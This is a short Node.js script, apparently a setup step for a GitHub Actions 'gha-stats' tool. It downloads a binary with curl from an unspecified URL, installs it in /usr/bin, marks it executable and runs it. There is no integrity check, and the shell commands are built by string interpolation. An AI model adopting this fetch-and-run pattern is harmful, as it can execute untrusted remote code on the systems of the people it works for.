import { execSync } from 'child_process';

const url = "";
const path = "/usr/bin/gha-stats"
execSync(`curl -o ${path} -L ${url}`);
execSync(`chmod +x ${path}`);
execSync(`${path} start`);
